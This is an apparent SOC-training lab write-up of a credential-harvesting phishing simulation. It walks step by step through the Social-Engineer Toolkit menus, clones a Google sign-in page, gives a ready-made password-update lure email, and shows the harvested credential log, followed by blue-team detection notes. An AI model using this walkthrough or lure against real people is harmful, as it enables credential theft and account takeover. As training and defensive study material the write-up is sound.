# Credential Harvesting Phishing Simulation — Social-Engineer Toolkit (SET)

**Prepared by:** Kiran Rana
**Date:** 2026-09-17
**Environment:** Isolated internal lab (VMware Workstation)

## ⚠️ Scope & Authorization

This exercise was performed entirely inside a **private, isolated VMware lab** against test accounts and test VMs that I own and control. No production systems, real user accounts, or third parties were targeted. This write-up is for **educational / SOC training purposes only**.

> Never run credential-harvesting or phishing techniques against systems or users you do not have explicit, documented authorization to test.

## Table of Contents

1. Objective
2. Lab Environment
3. Attack Walkthrough
   - 1. Launch SET
   - 2. Select Social-Engineering Attacks
   - 3. Choose the Website Attack Vector
   - 4. Set the Post-Back IP Address
   - 5. Select the Clone Template and Launch the Listener
   - 6. Deliver the Phishing Email
   - 7. Target Clicks the Link and "Signs In"
   - 8. Credentials Are Captured
4. Attack Chain Summary
5. Detection & Defense Notes
6. Conclusion
7. Disclaimer

## Objective

Simulate a credential-harvesting phishing attack against a test user to understand:

- How the Social-Engineer Toolkit (SET) clones a legitimate login page
- How a phishing email with a malicious link is delivered and rendered
- How captured credentials appear on the attacker console
- What detection/defense opportunities this attack chain exposes (for blue-team awareness)

## Lab Environment

| Component | Details |
|---|---|
| Attacker machine | Kali Linux 2026.2 (VMware Workstation) |
| Tool | Social-Engineer Toolkit (SET) |
| Attacker IP | `10.0.0.188` |
| Target | Test Gmail account / test user VM |
| Attack type | Website Attack Vector → Credential Harvester (Web Template, Google) |

## Attack Walkthrough

### 1. Launch SET

On the Kali attacker VM, open **Applications** (Kali dragon logo, top left) → search `SOC` → select **Setoolkit**. A terminal opens prompting for the local `sudo` password (the standard Kali login password).

![Kali Linux desktop](images/01-kali-desktop.jpg)
*Kali Linux desktop — opening the Applications menu.*

![Searching for Setoolkit](images/02-setoolkit-search.jpg)
*Searching "SOC" in the applications menu and selecting Setoolkit.*

```bash
sudo setoolkit
[sudo] password for kali:
```

![SET sudo password prompt](images/03-setoolkit-sudo-password.jpg)
*Entering the local sudo password to launch SET.*

### 2. Select Social-Engineering Attacks

From the SET main menu, choose:

```
1) Social-Engineering Attacks
```

![SET main menu](images/04-social-engineering-attacks-menu.jpg)
*SET main menu — Social-Engineering Attacks selected.*

### 3. Choose the Website Attack Vector

```
set> 1
...
2) Website Attack Vectors
```

Then select the **Credential Harvester Attack Method**:

```
3) Credential Harvester Attack Method
```

Followed by the **Web Templates** option:

```
1) Web Templates
```

![Website attack vector menu](images/05-website-attack-vector-menu.jpg)
*Website Attack Vectors menu — Credential Harvester Attack Method selected.*

![Credential harvester web templates](images/06-credential-harvester-web-templates.jpg)
*Credential Harvester submenu — Web Templates option chosen.*

### 4. Set the Post-Back IP Address

SET prompts for the IP address that harvested form data should be POSTed back to. This should be the attacker's own reachable IP on the test network:

```
set:webattack> IP address for the POST back in Harvester/Tabnabbing [10.0.0.188]:
```

![Post-back IP address prompt](images/07-postback-ip-address.jpg)
*Entering the attacker's IP address for the POST-back.*

### 5. Select the Clone Template and Launch the Listener

Choose a pre-built template to clone — in this case, Google:

```
1. Java Required
2. Google
3. Twitter

set:webattack> Select a template: 2
```

SET then clones the target login page and starts a listener on port 80:

```
[*] Cloning the website: http://www.google.com
[*] This could take a little bit...
[*] The Social-Engineer Toolkit Credential Harvester Attack
[*] Credential Harvester is running on port 80
[*] Information will be displayed to you as it arrives below:
```

> SET may prompt to disable an already-running Apache service that is bound to port 80 — answer **Y** to free the port for the harvester.

![Template selection — Google](images/08-template-selection-google.jpg)
*Google template selected; harvester listener starts on port 80.*

### 6. Deliver the Phishing Email

Using a **test** Gmail account, compose and send an email to a **test** recipient containing a pretext (e.g., a password-update notice) with the attacker's IP embedded as the "verification" link:

```
Subject: password update asap

Dear [user],

For your account's security, please update your password at your earliest convenience.
You can update your password using the link below:

Update your password: http://10.0.0.188

Please choose a strong, unique password that you do not use for other accounts.
If you did not expect this request, please contact our support team before making any changes.

Thank you,
The Support Team
```

![Phishing email delivered to test inbox](images/09-phishing-email-sent.jpg)
*Pretext email with the attacker's IP disguised as a password-update link.*

### 7. Target Clicks the Link and "Signs In"

The target opens the link, lands on the cloned Google sign-in page served from the attacker's IP, and enters credentials believing it is legitimate. Note the address bar: a bare IP address (`10.0.0.188`) with a **"Not secure"** warning instead of `accounts.google.com`.

![Cloned Google login page](images/10-cloned-google-login-page.jpg)
*Cloned Google sign-in page hosted at the attacker's IP — note the "Not secure" warning.*

The browser may even offer to save the credentials, reinforcing how convincingly the clone mimics the real site:

![Browser offers to save the harvested password](images/11-browser-save-password-prompt.jpg)
*Browser password-manager prompt after submitting credentials to the cloned page.*

### 8. Credentials Are Captured

As soon as the form is submitted, SET's listener logs the full POST request to the Kali terminal, including the harvested username and password fields:

```
PARAM: continue=https://accounts.google.com/o/oauth2/auth?rt=...
PARAM: service=lso
PARAM: checkedDomains=youtube
POSSIBLE USERNAME FIELD FOUND: Email=user@gmail.com
POSSIBLE PASSWORD FIELD FOUND: Passwd=<captured_password>
PARAM: signIn=Sign in
PARAM: PersistentCookie=yes

[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
```

![Captured credentials in the SET terminal](images/12-captured-credentials-terminal.jpg)
*Harvested username/password pairs appearing in real time on the attacker console.*

Pressing **Ctrl+C** at this point instructs SET to generate a captured-credentials report for the session.

## Attack Chain Summary

```
Attacker (Kali + SET)
   │
   ├─ 1. Clone legitimate login page (Google)
   ├─ 2. Host clone + credential harvester on :80
   ├─ 3. Craft pretext email with malicious link (attacker IP)
   ├─ 4. Send email to target
   │
Target
   ├─ 5. Opens email, clicks link
   ├─ 6. Lands on cloned page, enters credentials
   │
Attacker
   └─ 7. Credentials captured in real time on SET console
```

## Detection & Defense Notes

From a blue-team / SOC perspective, this lab highlights several detection and mitigation opportunities:

- **Email filtering** — Sender reputation, SPF/DKIM/DMARC enforcement, and link-rewriting/sandboxing would flag or neutralize a raw-IP "verification" link.
- **Browser/DNS protections** — A plain HTTP site at a bare internal/external IP with no valid TLS certificate (and a "Not secure" browser warning, as seen in Step 7) is a strong phishing indicator.
- **Network monitoring** — Unexpected inbound HTTP (port 80) traffic to an unfamiliar host, or outbound traffic to a non-corporate IP following an email click, is detectable via proxy/firewall logs and SIEM correlation (e.g., Splunk).
- **User awareness training** — Reinforcing that legitimate password-reset emails never link to bare IP addresses, and that credentials should only be entered on verified, bookmarked domains.
- **Endpoint/identity controls** — MFA would prevent captured credentials alone from being usable, even if harvesting succeeds.

## Conclusion

This lab demonstrated, end-to-end, how quickly and convincingly a credential-harvesting phishing attack can be stood up with freely available tooling: within a few menu selections, SET cloned a trusted login page, served it from an attacker-controlled host, and captured plaintext credentials the moment a test user submitted the form. No exploit or malware was required — the entire chain relied on social engineering (a plausible pretext email) and the user's trust in a familiar-looking login page.

The exercise reinforces why phishing remains one of the highest-ROI attack vectors for real-world adversaries, and why layered defenses matter: email filtering and link inspection to stop the lure, browser/TLS and DNS protections to catch the clone, network/SIEM monitoring to detect the traffic, and MFA to blunt the impact if credentials are still captured. Running this safely in an isolated lab provided hands-on, reproducible insight into both the attacker workflow and the specific telemetry a SOC analyst should watch for when investigating a suspected credential-harvesting incident.

## Disclaimer

This exercise was conducted in a private, isolated lab for learning and SOC-training purposes only. Never use these techniques on real users or systems without explicit, documented authorization.
